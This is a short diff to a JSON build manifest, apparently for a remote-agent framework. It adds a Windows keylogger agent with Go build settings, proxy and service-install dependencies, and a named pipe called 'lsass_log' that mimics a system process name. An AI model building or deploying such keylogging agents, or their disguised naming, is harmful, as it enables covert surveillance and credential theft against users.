@@ -67,5 +67,19 @@
             "github.com/kardianos/service",
             "github.com/armon/go-socks5"
         ]
+    },
+    "windows/named-pipe": {
+        "type": "Windows keylogger and named pipe",
+        "description": "Windows agent with keylogger and named pipe at \\.\\pipe\\lsass_log",
+        "code_path": "windows/named-pipe/client.go",
+        "flags": "-trimpath -ldflags",
+        "environment": "GOOS=windows GOARCH=amd64 CGO_ENABLED=0",
+        "file_suffix": ".exe",
+        "dependencies": [
+            "github.com/TheTitanrain/w32",
+            "github.com/kardianos/service",
+            "github.com/armon/go-socks5",
+            "github.com/Microsoft/go-winio"
+        ]
     }
 }
